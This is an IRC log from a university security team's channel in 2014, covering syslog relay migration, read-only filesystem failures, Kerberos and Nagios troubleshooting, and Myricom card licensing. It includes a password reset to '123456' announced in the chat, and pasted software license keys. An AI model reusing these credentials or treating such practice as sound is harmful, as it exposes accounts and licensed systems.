2014-09-09 13:05:40	eyrich	ok
2014-09-09 13:05:49	jschipp	no big deal I say unless we see more 
2014-09-09 13:08:15	wardog	jschipp: all IO failed? You could potentially check syslogs to see the last record time yesterday in teh different logs.
2014-09-09 13:08:31	wardog	syslogs on-host
2014-09-09 13:13:23	eyrich	wardog: SAN drive worked, marked as global spare
2014-09-09 13:14:58	wardog	eyrich: Wayland has a SAS->SATA converter and a drive eraser. We can see if that'll work.
2014-09-09 13:15:07	eyrich	ok
2014-09-09 13:15:12	wardog	He'll drop it by later
2014-09-09 13:15:18	eyrich	great
2014-09-09 13:26:34	wardog	Live iWatch announcement http://www.apple.com/live/2014-sept-event/
2014-09-09 13:26:39	wardog	It actually looks pretty cool
2014-09-09 13:32:41	soehlert	jazoff: drought is up and running to the point of being in puppet (lacking role::profile) and allowing kerb auth
2014-09-09 13:41:17	eyrich	requires iphone BOO!
2014-09-09 13:43:01	wardog	yeah. Stupid.
2014-09-09 13:43:26	wardog	They can thus increase their iPhone marketshare at the same time.
2014-09-09 13:43:40	eyrich	ya probably - but not from me they wont
2014-09-09 13:50:16	soehlert	what?! but you're an apple guy through and through..
2014-09-09 13:50:36	wardog	No worries. Samsung, or someone will come up with another competitor while apple's product grows stale.
2014-09-09 13:50:48	wardog	Er a competing product
2014-09-09 13:51:50	soehlert	is this not just an answer to Android wear?
2014-09-09 13:51:56	eyrich	LG and Moto already have them
2014-09-09 13:55:12	wardog	soehlert: you forgot the iPhone fanboy part.
2014-09-09 14:00:57	soehlert	you mean for eyrich?
2014-09-09 14:01:29	jazoff	soehlert: is the new drought plugged into the gigagmon?
2014-09-09 14:01:32	wardog	I mean fanboys didn't have a watch.
2014-09-09 14:01:39	wardog	Not like they're going to get a Wear
2014-09-09 14:03:20	eyrich	You don't have permission to access "http://store.apple.com/" on this server.
2014-09-09 14:09:52	jazoff	yeah, they do that
2014-09-09 14:12:38	wardog	eyrich: I'm guessing you'll also need a more modern iPhone
2014-09-09 14:12:43	soehlert	jazoff: yes drought is plugged in to where we thought old drought was
2014-09-09 14:12:55	wardog	Or, if anything, need one to use ALL iWatch features.
2014-09-09 14:13:04	jazoff	soehlert: ok.
2014-09-09 14:13:14	eyrich	5 and 6 models only
2014-09-09 14:13:21	jazoff	of course
2014-09-09 14:13:29	jazoff	have to get people to upgrade somehow
2014-09-09 14:13:43	eyrich	might be tied to BT LE
2014-09-09 14:13:58	eyrich	not sure when they added that
2014-09-09 14:14:14	soehlert	so i think i have the centos seclogs ready to go, it's mounted the archive, syslog is listening, archival script and associated cron job exist. just not sure how to test it..i guess point the relays at both for now and then switch over once it seems to be working?
2014-09-09 14:15:00	jschipp	wardog: no, on /dev/sda1. Root filesystem had errors.
2014-09-09 14:16:29	jschipp	soehlert: yep
2014-09-09 14:16:49	jschipp	what's the IP?
2014-09-09 14:19:37	soehlert	141.142.148.43 for now
2014-09-09 14:20:39	jschipp	want the relays to point to it now?
2014-09-09 14:21:15	soehlert	sure
2014-09-09 14:21:31	soehlert	wait
2014-09-09 14:21:55	soehlert	is this gonna cause some weird issues where both the rhel and centos seclogs machiens are writing to the archive? i wonder what that's gonna do
2014-09-09 14:22:15	jschipp	ah, yes, that will happen. 
2014-09-09 14:22:33	jschipp	Can you temporarily change the destination on the new machine?
2014-09-09 14:23:12	jschipp	We just need to know if it can recieve and write logs
2014-09-09 14:25:10	soehlert	ya sure lemme do that real quick
2014-09-09 14:28:28	soehlert	wait im not sure how to pull that off. id have to set up a new archive on lowp basically right?
2014-09-09 14:30:11	jschipp	I mean, write to the local drive on the new server
2014-09-09 14:30:24	jschipp	I don't think we need to test NFS
2014-09-09 14:30:43	jschipp	at least not at the moment
2014-09-09 14:31:01	soehlert	ah so basically just say no to the archival stuff ya that makes sense
2014-09-09 14:31:09	soehlert	just worried about how quickly it will fill up 
2014-09-09 14:32:06	jschipp	we do about 5G a day M-F, so it would last a few weeks I imagine but we just need to test for a few minutes
2014-09-09 14:32:40	jschipp	overnight would be fine too of course
2014-09-09 14:33:00	soehlert	ya i was thinking a day or two. sounds like we'll be finet hen
2014-09-09 14:33:46	soehlert	ok archival stuff removed and turned off in puppet for now
2014-09-09 14:33:53	soehlert	gimme the firehose
2014-09-09 14:34:34	jschipp	lol
2014-09-09 14:41:52	jschipp	yay! 
2014-09-09 14:41:53	jschipp	[root@relay01-sec ~]# netstat -nt | grep 141.142.148.43
2014-09-09 14:41:53	jschipp	tcp      504      0 10.142.158.70:44595         141.142.148.43:514          ESTABLISHED 
2014-09-09 14:43:37	soehlert	woot. and the logs are flowing in. i did a logger test that passed as well
2014-09-09 14:44:52	jschipp	:)
2014-09-09 15:03:13	eyrich	if we are doing 5G of logs per day - why do the relay boxes have 1.2 TB drives?
2014-09-09 15:03:43	eyrich	thats a lot of drive, even thin provisioned they can cause problems to deal with
2014-09-09 15:05:59	eyrich	like 4 hours to migrate, and many hours for veeam to do diffs on
2014-09-09 15:07:25	jschipp	disaster happens, buffer as much as they can. I was expecting a lot more logs with the blue waters (8000 nodes) switch over to syslog-sec but we don't get that. The size was chosen before that happened and I tried to give more instead of being short.
2014-09-09 15:07:43	soehlert	im in so many pictures today. tours all day long. thankfully they are purposely avoiding me for the ones going on facebook
2014-09-09 15:07:53	eyrich	:)
2014-09-09 15:08:11	jschipp	it's definitely overkill
2014-09-09 15:08:15	eyrich	jschipp: ok good answe
2014-09-09 15:08:28	eyrich	we may want to resize them eventually - but does not need to be soon
2014-09-09 15:08:40	eyrich	i figure 10 days of buffer is enough
2014-09-09 15:09:08	jschipp	soehlert: oh, are you working at NPCF?
2014-09-09 15:09:20	jschipp	eyrich: yeah
2014-09-09 15:10:05	jschipp	does anyone know if it's documented anywhere what blue water is sending? e.g. is it only high severity logs and from head nodes,etc? 
2014-09-09 15:12:07	wardog	It should all be coming through ISC?
2014-09-09 15:13:13	soehlert	jschipp: ya im here
2014-09-09 15:13:33	soehlert	jschipp: i dont think its documented to my knowledge, i also think theres two or three routes it can take
2014-09-09 15:20:51	jschipp	ah, who's in charge of sending us the blue waters logs? I'd like to get that written up or something just to make sure we're seeing what we need.
2014-09-09 15:21:49	soehlert	thats the issue.
2014-09-09 15:21:49	soehlert	about 12 people
2014-09-09 15:22:03	soehlert	though i guess starting with jenos, jalt, and joshi would be a good group
2014-09-09 15:23:23	jschipp	what's the fulle 3rd name? don't recongize it
2014-09-09 15:23:35	soehlert	joshi is the full name
2014-09-09 15:23:40	soehlert	he's the one who runs ISC
2014-09-09 15:24:54	jschipp	more than 10 joshi's match in LDAP
2014-09-09 15:25:32	jschipp	and I don't see just 'joshi' 
2014-09-09 15:26:30	soehlert	fullop. it might be under joshua or something
2014-09-09 15:26:51	soehlert	ya fullop@illinois
2014-09-09 15:27:32	jschipp	kk, thanks
2014-09-09 15:38:11	jschipp	any idea if there's a list of BW hostnames somewhere?
2014-09-09 15:41:33	soehlert	i doubt it
2014-09-09 15:41:43	soehlert	you'll have to ask those three though
2014-09-09 15:55:44	jschipp	do you have an account on https://bw-wiki.ncsa.illinois.edu?
2014-09-09 15:58:40	jschipp	ISC document is here describing the basics: https://bw-wiki.ncsa.illinois.edu/display/HWandSW/ISC+-+BW+Subsystem+Data+Collection
2014-09-09 16:03:38	soehlert	no i dont think so. and the problem is most of the documentation is wildly out of date.
2014-09-09 16:14:39	jschipp	"The 27000 mainframe nodes are contained in the LLM flow (sent to ISC from smw, but not forwarded to security)." - Jeremy
2014-09-09 16:15:14	jschipp	https://jira.ncsa.illinois.edu/browse/BWCC-527
2014-09-09 16:15:45	jschipp	so we get very few :(
2014-09-09 16:25:36	soehlert	ya i think the load would far exceed what we could handle
2014-09-09 16:25:43	soehlert	why did you want their logs so badly?
2014-09-09 16:34:04	jschipp	curiousity, I have a burning desire to see if we can handle that much. I like tuning :)
2014-09-09 16:35:38	soehlert	hah gotcha
2014-09-09 18:15:20	<--	eyrich (eyrich@D077DE37.62651FD3.B1B5B983.IP) has quit (Ping timeout)
2014-09-10 07:35:30	-->	eyrich (eyrich@4392B613.B217C5DC.B1B5B983.IP) has joined #security
2014-09-10 08:11:24	eyrich	wardog: did wayland make it over?
2014-09-10 09:45:10	wardog	no. I'll ping him
2014-09-10 11:10:02	jschipp	Is subzero still in use? Nagios can't ping it
2014-09-10 11:10:17	soehlert	it's having issues
2014-09-10 11:10:41	soehlert	should be pingable though, i just couldnt get puppet to work on it
2014-09-10 11:10:52	soehlert	though it appears it went down...
2014-09-10 11:45:30	jschipp	analysis-sec had the same I/O error that git-sec did, dated. Caused /var to mount as ro and rsyslog couldn't write out its logs. Missing 2 days of logs, weren't buffered because I believe rsyslog was receiving them but just through them away but it couldn't write them for a related reason.
2014-09-10 11:45:43	jschipp	seems to have happend at Sep  6 04:13:29
2014-09-10 11:45:58	jschipp	I just wrote a basic nagios check to look for the same error in dmesg
2014-09-10 11:46:03	wardog	FYI, BW tours today.
2014-09-10 11:46:20	jschipp	threw*
2014-09-10 11:46:56	wardog	I wonder if doing r/w tests on all volumes might help as a supplemental check
2014-09-10 11:47:00	wardog	Even a simple 'touch' command.
2014-09-10 11:47:43	jschipp	yeah, the touch command for each parition is what I have in mind for a better check
2014-09-10 12:02:04	jazoff	a similar thing kept happening at UA a while ago
2014-09-10 12:02:23	jazoff	the netapp would have a blip, every vm would remount R/O and everything would be broken for hours
2014-09-10 12:02:46	jazoff	didn't occur to them to actually monitor it using nagios though :)
2014-09-10 12:55:32	jschipp	jazoff: are munin graphs displaying for you?
2014-09-10 12:58:09	wardog	anyone got any torx screw drivers in the office?
2014-09-10 13:00:09	jazoff	jschipp: no...
2014-09-10 13:00:17	jschipp	ferk
2014-09-10 13:00:24	jazoff	is the disk RO on that box too?
2014-09-10 13:03:02	jschipp	I don't know, I can't get logged in
2014-09-10 13:03:55	jschipp	Permission denied (gssapi-keyex,gssapi-with-mic).
2014-09-10 13:04:03	jschipp	kerberos configured?
2014-09-10 13:10:05	jazoff	it was
2014-09-10 13:12:13	soehlert	kerberos seemingly is getting screwed up all over the place today. quick fix as long as you have access to the box but boy is it a pain
2014-09-10 13:20:44	wardog	Everyone available for whiparound assuming 2013 is open?
2014-09-10 13:20:50	soehlert	ya
2014-09-10 13:21:24	jschipp	yerp
2014-09-10 13:21:27	wardog	jazoff: didn't disappear because he forgot bout food?
2014-09-10 13:21:42	soehlert	he usually tells us
2014-09-10 13:21:54	wardog	icepick says 2. He's working on something with fleury
2014-09-10 13:22:13	soehlert	ok 
2014-09-10 13:23:41	jazoff	i'm here
2014-09-10 13:24:37	wardog	wander to the office at 2
2014-09-10 13:24:39	wardog	er 2013
2014-09-10 13:43:21	jschipp	after talking to the BW admins, looks like we've missing logs from about 88 hosts. Got about half of those sending to us beginning today.
2014-09-10 13:46:06	jschipp	I want to see the graph :(
2014-09-10 13:47:40	soehlert	"Read-only file system"
2014-09-10 13:47:46	soehlert	reboot munin?
2014-09-10 13:49:12	wardog	soooo, have we checked all our systems for any other r/o mounted issues?
2014-09-10 13:49:13	jschipp	I can't get logged in, so I can't check
2014-09-10 13:49:22	jschipp	well, I guess I could use the console
2014-09-10 13:49:26	soehlert	jschipp: i'm on it and telling you it's r/o
2014-09-10 13:49:34	soehlert	asking if i should reboot
2014-09-10 13:49:35	jschipp	oh, thanks
2014-09-10 13:49:42	eyrich	i think every(many) system that was using the wrong vsads got its file system marked RO when veeam saturated the links on saturday backing up relay01's 1.2TB file also stored on the wrong vsad
2014-09-10 13:49:44	jschipp	yeah, that's how I fixed the other too
2014-09-10 13:49:51	jschipp	two*
2014-09-10 13:50:23	eyrich	well weird munin was not one of those
2014-09-10 13:50:29	jschipp	git-sec dropped me into single user mode from which I ran fsck on each volume then it was fine.
2014-09-10 13:50:38	jschipp	analysis-sec was just fixed by a reboot
2014-09-10 14:01:45	wardog	jazoff: 217-300-3465
2014-09-10 14:02:07	jazoff	oh, i called the conf number
2014-09-10 15:19:14	jazoff	eyrich: what is your ip that is registerd?
2014-09-10 15:19:35	eyrich	141.142.23.4
2014-09-10 15:22:28	jazoff	ah, interesting
2014-09-10 15:22:35	jazoff	Owner ans Used by are blank
2014-09-10 15:22:48	jazoff	but the entry for the dns record has a comments of 'Activated by eyrich'
2014-09-10 15:25:10	wardog	try 141.142.23.15
2014-09-10 15:25:40	jazoff	same, must be how they are loading the data
2014-09-10 15:25:47	jazoff	which is fine, i can work with that
2014-09-10 15:36:18	jazoff	ok, so for your IP i have it returning
2014-09-10 15:36:19	jazoff	Status: Static
2014-09-10 15:36:19	jazoff	Description:
2014-09-10 15:36:19	jazoff	Used by: wraquel
2014-09-10 15:36:19	jazoff	    Name: 15.23.142.141.in-addr.arpa
2014-09-10 15:36:20	jazoff	    Name: skaro.ncsa.illinois.edu  Activated by wraquel
2014-09-10 15:56:06	wardog	no mac address listed?
2014-09-10 16:17:12	jazoff	hmm
2014-09-10 16:17:23	jazoff	i'll mess around with it more later
2014-09-10 16:17:34	jazoff	fighting with some BHR test cases
2014-09-10 16:17:50	jazoff	block for 3 seconds, sleep for 6 should result in 0 expecting blocks, not 1 :(
2014-09-10 16:18:06	jazoff	i must have a > instead of a < somewhere
2014-09-10 16:20:42	jschipp	jesus, there's so many boxes that can't connect to the puppet catalog. Doing all then nagios stuff by hand :(
2014-09-10 16:21:39	jazoff	jschipp: ssl errors?
2014-09-10 16:23:42	jschipp	nope, 
2014-09-10 16:23:46	jschipp	[root@lowp ~]# puppet agent -t
2014-09-10 16:23:47	jschipp	Error: Failed to apply catalog: No route to host - connect(2)
2014-09-10 16:23:47	jschipp	Error: Could not send report: No route to host - connect(2)
2014-09-10 16:24:02	jazoff	ahh
2014-09-10 16:24:22	jazoff	is that the real no route to host or the one that iptables triggers
2014-09-10 16:25:58	jschipp	[root@monsoon ~]# ping puppet-sec
2014-09-10 16:25:59	jschipp	PING puppet-sec.ncsa.illinois.edu (141.142.148.83) 56(84) bytes of data.
2014-09-10 16:25:59	jschipp	64 bytes from puppet-sec.ncsa.illinois.edu (141.142.148.83): icmp_seq=1 ttl=64 time=1.42 ms
2014-09-10 16:26:15	jschipp	real route works, presuming it's using that DNS name
2014-09-10 16:26:30	jazoff	try adding --debug 
2014-09-10 16:27:22	jschipp	doesn't display anything else about the route issue
2014-09-10 16:27:54	jazoff	does it confirm what hosts it is trying to connect to
2014-09-10 16:27:59	jazoff	i suppose tcpdump would work too
2014-09-10 16:44:18	jazoff	ah. something is caching the result of now() so time isn't passing.. that'll do it
2014-09-10 16:46:42	jazoff	Ran 33 tests in 14.685s
2014-09-10 16:46:43	jazoff	OK
2014-09-10 16:46:43	jazoff	:)
2014-09-10 16:57:22	jschipp	nice
2014-09-10 16:58:02	jschipp	ah, so all these machines are configured for squall.
2014-09-10 16:58:45	jschipp	I guess they haven't been transferred over yet
2014-09-10 17:03:54	jschipp	I'm not able to ssh into squid-sec, workign for you
2014-09-10 17:03:59	jschipp	*?
2014-09-10 17:37:25	jazoff	hmm
2014-09-10 17:37:44	jazoff	not with krb
2014-09-10 21:01:19	--	irc: disconnected from server
2014-09-10 21:01:30	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-09-10 21:01:30	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-09-10 21:01:42	--	Mode #security [+]
2014-09-10 21:01:42	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-09-11 07:42:35	<--	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has quit (Ping timeout)
2014-09-11 08:09:25	-->	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has joined #security
2014-09-11 11:02:14	soehlert	is all of this tepid stuff supposed to be happening?
2014-09-11 11:04:15	jazoff	not cool tepid. not cool
2014-09-11 11:06:36	soehlert	terry tried to switch an ip to one that is blocked by the fw because idk
2014-09-11 11:22:05	eyrich	soehlert: hes cleaning up the IP space post net changes, 
2014-09-11 11:22:17	eyrich	putting releated services together - I approve
2014-09-11 11:30:10	soehlert	then why did he revert the ip change he made?
2014-09-11 11:30:19	eyrich	i dont know
2014-09-11 11:30:36	eyrich	i guess it broke stuff so he figure out he needs to schedule it
2014-09-11 11:30:41	eyrich	i didnt know he had
2014-09-11 11:34:48	soehlert	i see thats what was weird to me
2014-09-11 11:44:07	soehlert	you'll need a new kerberos ticket
2014-09-11 11:44:12	soehlert	but munin-sec is back
2014-09-11 11:46:09	soehlert	strange squid-sec was r/o too and it definitely didnt get moved or anythign
2014-09-11 11:49:12	soehlert	squid-sec is now accepting kerb too
2014-09-11 12:03:37	jschipp	disregard all nagios2-sec notifications, doing DNS testing
2014-09-11 13:26:01	jschipp	seems like it may be a good idea to add timeout:1 attempt:1 to resolv.conf since the default timeout value is pretty high
2014-09-11 13:26:13	jschipp	systemwide I mean, not for nagios
2014-09-11 13:29:07	eyrich	im not sure thats not a good idea, if you have to wait for a non cached resolution it might take more then 1 second.
2014-09-11 13:29:25	eyrich	what is the defaults?
2014-09-11 13:29:37	eyrich	is/are
2014-09-11 13:30:10	eyrich	I do think we should point to the name server that is in NPCF first
2014-09-11 13:30:19	eyrich	for any server that is in npcf
2014-09-11 13:30:34	jschipp	5 (timeout) * 2 (attempts) = 10 seconds if it can't contact the first DNS server
2014-09-11 13:30:46	jschipp	^defaults
2014-09-11 13:31:16	jschipp	DNS resolution on our network should never take more than a second. Should be low milliseconds
2014-09-11 13:31:29	eyrich	only for local hosts
2014-09-11 13:32:06	eyrich	i think we should leave it at defaults for eveyrthing but nagios and switch to the unbound system for nagios
2014-09-11 13:33:56	eyrich	never mind i guess 141.142.2.2 is at NPCF
2014-09-11 13:34:15	eyrich	141.142.230.144 is at ncsa
2014-09-11 13:36:31	soehlert	thats what i thought. so we have that aspect as you want like it is then
2014-09-11 13:37:07	eyrich	yes, i thought 2.2 was in ncsa - so we are good on that, as long as we are not using rotate
2014-09-11 14:04:24	 *	jschipp brb, walk
2014-09-11 14:05:06	soehlert	i'm having issues with git and puppet somewhere. i pushed a change, but looking on puppet-sec it didnt't take
2014-09-11 14:05:35	eyrich	i still can not log into git-sec
2014-09-11 14:08:34	soehlert	?
2014-09-11 14:08:54	soehlert	as in the WUI?
2014-09-11 14:09:01	eyrich	yes
2014-09-11 14:09:23	eyrich	i think jazoff said the same thing a couple weeks ago
2014-09-11 14:11:48	soehlert	what kind of issue is it? is it not loading?
2014-09-11 14:11:54	soehlert	or incorrect creds?
2014-09-11 14:12:07	eyrich	I can not log in, always says bad credentials, and password reset does not work
2014-09-11 14:13:03	soehlert	ah that i dont know how to help with
2014-09-11 14:13:53	jazoff	you are using  eyrich as teh username?
2014-09-11 14:14:06	eyrich	i have tried that and with my email
2014-09-11 14:14:29	jazoff	i just changed your password to 123456
2014-09-11 14:15:29	eyrich	why is it not using something for back end auth? either kerb or AD ldap
2014-09-11 14:17:40	eyrich	what is the name of the project where the IP space allocation is? searching for 141.142.148 did not have results
2014-09-11 14:18:54	soehlert	its in the secops repo
2014-09-11 14:19:01	soehlert	private_ips and public_ips
2014-09-11 14:21:35	eyrich	wow search on that sucks - I wonder if it is even indexing
2014-09-11 14:21:55	soehlert	huh?
2014-09-11 14:22:23	soehlert	oooh the search bar in git-sec
2014-09-11 14:22:24	eyrich	the search box was not returning any results - no matter what i serched for
2014-09-11 14:22:34	soehlert	ya idk ive never used it. git grep
2014-09-11 15:01:49	soehlert	eyrich: what's the netmask of a 141.142.149.0 host now? and is 141.142.149.1 the gateway?
2014-09-11 15:02:04	eyrich	yes GW did not change
2014-09-11 15:02:10	eyrich	yes /25
2014-09-11 15:02:14	soehlert	ok thanks
2014-09-11 15:05:27	jschipp	[root@nagios-sec ~]# cat /etc/redhat-release
2014-09-11 15:05:28	jschipp	Red Hat Enterprise Linux Server release 6.5 (Santiago)
2014-09-11 15:05:41	soehlert	can you please allow fog/dew/cerberus0/4 to ssh to 141.142.149.32 eyrich?
2014-09-11 15:06:09	jschipp	wtf, I know I migrated this :/
2014-09-11 15:06:30	soehlert	ooo did you happen to turn off the wrong one :(
2014-09-11 15:08:33	jschipp	ferk, maybe I did but jesus I can't imagine that I haven't noticed for this long
2014-09-11 15:08:55	eyrich	soehlert: should be done
2014-09-11 15:10:33	soehlert	eyrich thanks
2014-09-11 15:10:44	soehlert	jschipp: ya that suuuuucks
2014-09-11 15:16:55	soehlert	anyone got any ideas for this? i am setting up centos tepid on a different ip than tepid resolves to, so kerberos won't work. need to leave it there until terry gets his stuff set up, but how to get him on? i use secops to get on, but he obviously doesn't have access to that user.
2014-09-11 15:17:25	eyrich	create a new local user and share in lastpass
2014-09-11 15:20:35	jazoff	i think we are doing DNS wrong :)
2014-09-11 15:21:30	soehlert	?
2014-09-11 15:22:21	jazoff	using non service specific hostnames for machine, but then publishing them instead of using cnames
2014-09-11 15:23:01	eyrich	tepid is the non server specific hostname
2014-09-11 15:23:16	eyrich	we are doing that for CA services
2014-09-11 15:24:32	jazoff	right.. but then I mean something is pointing to tepid rather than ca01
2014-09-11 15:31:28	eyrich	WTF is up with all these monitoring emails and sms messages. Can we just off the notification system until this is fixed
2014-09-11 15:34:03	jschipp	I just fixed it. I'm having a rough time over here. 
2014-09-11 15:34:16	eyrich	ok
2014-09-11 17:10:15	jschipp	does anyone know the address of the log forwarding page on the wiki that shows how to configure rsyslog and syslog-ng? I can't find it
2014-09-11 17:59:22	jschipp	ferk
2014-09-12 09:17:32	eyrich	wardog: are you going to email the user, re:spam ?
2014-09-12 09:31:37	jazoff	eyrich: stress tested the new BHR code last night with 100,000+ blocks
2014-09-12 09:31:50	jazoff	found some sql performance issues, I think i fixed most of them
2014-09-12 09:32:08	eyrich	nice
2014-09-12 09:32:34	jazoff	i think the 'unblock pending' query is still slow when there are 20k items to remove
2014-09-12 09:32:53	jazoff	but the host specific unblock queue query works fine
2014-09-12 09:33:30	jazoff	things would be a lot simpler if I did try using bitmasks to keep track of block/unblocked, but I don't know how well that would work in practice
2014-09-12 09:33:54	jazoff	things get a little tricky when you have multiple blocker hosts..
2014-09-12 09:34:32	jazoff	if one enters a block request for 5 minutes, but both bgp machines are down for 10 minutes, when they come back up the request shouldn't be in either the block queue or the unblock queue
2014-09-12 09:34:39	wardog	eyrich: I can
2014-09-12 09:35:31	jazoff	i think the main remaining performance problem is the block/unblock speed
2014-09-12 09:36:11	jazoff	I added a mblock function for blocking multiple hosts with one request, so it can easily block 500 hosts in a few seconds, but the blocked/unblock tracking is still 1 request each so it maxes out at around 20 changes/sec
2014-09-12 09:59:00	wardog	rpz would be nice for that phishing email today.
2014-09-12 10:02:58	jazoff	vlad said he is working on something like a tcp reset tool but for injecting spoofed dns responses
2014-09-12 10:03:06	jazoff	probably can't run it, but it's cool :)
2014-09-12 10:30:46	jschipp	I think he may be using mousetooth for that, he talked about it at the NSM meeting.
2014-09-12 10:32:08	wardog	is the full list of used .148 addresses in git?
2014-09-12 10:32:28	wardog	Or are we still using the wiki page?
2014-09-12 10:33:28	soehlert	ive kept it as up to date as i can. so unless someones added something in the last couple weeks without updating, it should be good
2014-09-12 13:52:32	eyrich	ncsabot seen 60.214.139.78
2014-09-12 13:52:48	eyrich	ncsabot traffic to 60.214.139.78
2014-09-12 13:53:35	ncsabot	Seen in 260 hours over 109 days. First seen in 2013-09-06.db. Last seen in 2014-09-12.db
2014-09-12 13:53:56	jazoff	that's a lot
2014-09-12 13:57:51	eyrich	burag thinks it might be a bad actor
2014-09-12 13:58:25	eyrich	i gotta go, Nick will contact you jazoff
2014-09-12 13:58:42	jazoff	ok
2014-09-12 14:04:43	wardog	China....
2014-09-12 14:05:48	wardog	Looks like mostly DNS traffic
2014-09-12 14:06:02	wardog	oh
2014-09-12 14:06:12	wardog	outbound dns
2014-09-12 14:08:25	wardog	looks like spoof traffic.
2014-09-12 14:08:31	wardog	timeline would be nice.
2014-09-12 14:15:12	soehlert	kitefeung.com...one of the absolute best sites to pick up handmade kites.
2014-09-12 14:33:11	soehlert	jazoff: how is the myricom stuff coming along?
2014-09-12 14:34:55	jazoff	oh! did you get it physically connectd?
2014-09-12 14:35:02	jazoff	i thought I was waiting on physical work in pcf
2014-09-12 14:35:06	soehlert	its been physically connected for weeks.
2014-09-12 14:35:12	jazoff	not uhhh
2014-09-12 14:35:31	soehlert	yup. because we thought this box was drought so we kept messing with it and drought didnt change
2014-09-12 14:35:38	jazoff	right
2014-09-12 14:35:55	soehlert	and so its been plugged in and set up unless icepick undid his work
2014-09-12 14:35:59	soehlert	on hte gigamon
2014-09-12 14:36:52	jazoff	ok.. i will get that going
2014-09-12 14:37:16	soehlert	well lemme know if its not plugged in. i can pop over there this afternoon and do it if thats the case somehow
2014-09-12 14:37:22	jazoff	do we have a myricom account?
2014-09-12 14:37:39	soehlert	uhhh maybe?
2014-09-12 14:37:39	soehlert	i know i emailed support about 4 years ago with help getting started
2014-09-12 14:37:42	jazoff	the last thing the person sent me was https://www.myricom.com/support/downloads/sniffer10g.html
2014-09-12 14:37:50	jazoff	but you need to login to download
2014-09-12 14:39:59	soehlert	Welp we have support or had it at least. not sure if its still active and i dont know what the account name/pass would be
2014-09-12 14:40:05	soehlert	i didnt have to log in to download it
2014-09-12 14:40:22	soehlert	they used to let anyone download but support sent a license file to actually activate it
2014-09-12 14:40:46	jazoff	ah, ok, drought looks good
2014-09-12 14:40:52	jazoff	it's connected to eth1
2014-09-12 14:41:27	soehlert	and i think i turned off the old one, but the one youre looking at is centos right?
2014-09-12 14:41:37	jazoff	yes
2014-09-12 14:41:41	jazoff	with a 9 day uptime
2014-09-12 14:41:48	soehlert	ok perfect, just making sure 
2014-09-12 14:41:55	jazoff	ok, i will contact myricom person
2014-09-15 07:41:52	<--	eyrich (eyrich@4392B613.B217C5DC.B1B5B983.IP) has quit (Quit: Leaving.)
2014-09-15 08:08:24	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-09-15 08:15:24	eyrich	a whole weekend without getting a nagios sms - yipee skipee
2014-09-15 08:15:58	jazoff	plot twist: nagios is broken?
2014-09-15 08:16:09	eyrich	i dont think so - got some emails - just not sms
2014-09-15 08:16:30	jazoff	my favorite: http://dilbert.com/strips/comic/2008-02-15/
2014-09-15 08:16:58	eyrich	nice
2014-09-15 08:19:31	eyrich	can I delete netflowsec-dev?
2014-09-15 08:19:33	eyrich	its not running
2014-09-15 08:27:39	eyrich	is tornadow for flows?
2014-09-15 08:29:41	jazoff	hmmm no that's flows-sec
2014-09-15 08:29:53	jazoff	was tornado the old netflow server? i forget
2014-09-15 08:29:54	eyrich	what the VM tornado for then?
2014-09-15 08:30:04	jazoff	ooh, that's the scanner VM
2014-09-15 08:30:07	jazoff	for nmap and stuff
2014-09-15 08:30:15	eyrich	ok
2014-09-15 09:04:58	eyrich	wardog: can I delete netflowsec-dev?
2014-09-15 09:08:35	wardog	yes
2014-09-15 09:20:58	jazoff	rebooting drought
2014-09-15 09:45:55	jazoff	Sep 15 09:45:19 drought puppet-agent[19546]: (/Stage[main]/Myricom::Kernel/Package[myri_snf]/ensure) created
2014-09-15 09:45:58	jazoff	woot
2014-09-15 09:46:05	wardog	yay
2014-09-15 09:46:19	jazoff	[root@drought ~]# /opt/snf/bin/myri_nic_info
2014-09-15 09:46:19	jazoff	# Serial MAC               ProductCode    Driver   Version     License
2014-09-15 09:46:19	jazoff	0 403851 00:60:dd:45:b2:fa 10G-PCIE-8BL-S myri_snf 3.0.0.50679 Invalid
2014-09-15 09:46:19	jazoff	1 400243 00:60:dd:45:c6:c2 10G-PCIE-8B-S  myri_snf 3.0.0.50679 Invalid
2014-09-15 09:46:21	wardog	after the bro systems, what else needs to be migrated?
2014-09-15 09:46:28	wardog	to centos
2014-09-15 09:46:33	jazoff	they sent me a 60day trial license, though that may be for the other box at this point
2014-09-15 09:46:37	jazoff	not sure how we get the permanent ones
2014-09-15 09:46:42	jazoff	or if we already have them
2014-09-15 09:47:38	jazoff	yeah, different box now
2014-09-15 09:47:56	wardog	jazoff: You should probably schedule your last trip to Champaign for the year
2014-09-15 09:52:45	jazoff	yes.. my schedule is a bit crazy next month
2014-09-15 09:52:51	jazoff	november is all clear though
2014-09-15 10:05:41	jazoff	is there a document somewhere that would have myricom license keys?
2014-09-15 10:07:14	jazoff	or maybe someone has a myricom account?
2014-09-15 10:09:46	wardog	check on chill
2014-09-15 10:09:51	wardog	Getting a few hits on 'myricom'
2014-09-15 10:10:03	jazoff	ah, forgot about chill
2014-09-15 10:10:28	wardog	No licesnse but this is the only non-meeting reference. https://chill.ncsa.illinois.edu/wiki/Upgrading_from_Bro-2.0_to_Bro-2.1
2014-09-15 10:14:28	wardog	checking the afs folder.
2014-09-15 10:17:05	wardog	nothing in the afs folders that I can find.
2014-09-15 10:26:16	jazoff	hmm, well that's annoying
2014-09-15 10:27:17	wardog	mind you I only did case insensitive sense for 'myricom'
2014-09-15 10:28:58	jazoff	the lincense they sent me looks like 80e7-e007-3659-8613:2:403856:SNF:V3:T1415737983: # s/n 403856 (expires 11/11/2014)
2014-09-15 10:29:07	jazoff	so maybe a search for SNF might find something
2014-09-15 10:46:01	wardog	Man, there's a lot of crap in those folders
2014-09-15 11:25:45	jazoff	ah, I found a file
2014-09-15 11:25:53	jazoff	[root@nids-28 snf]# cat /opt/snf/license
2014-09-15 11:25:53	jazoff	197e-e106-6609-56c3:2:393837:SNF:V2: # s/n 393837
2014-09-15 11:25:53	jazoff	87e0-8067-fe91-b92c:2:400195:SNF:V2: # s/n 400195
2014-09-15 11:25:53	jazoff	ec8b-5dba-dbb4-25b0:2:400235:SNF:V2: # s/n 400235
2014-09-15 11:25:54	jazoff	etc
2014-09-15 11:26:16	jazoff	though that's for V2 and V3 is the new one
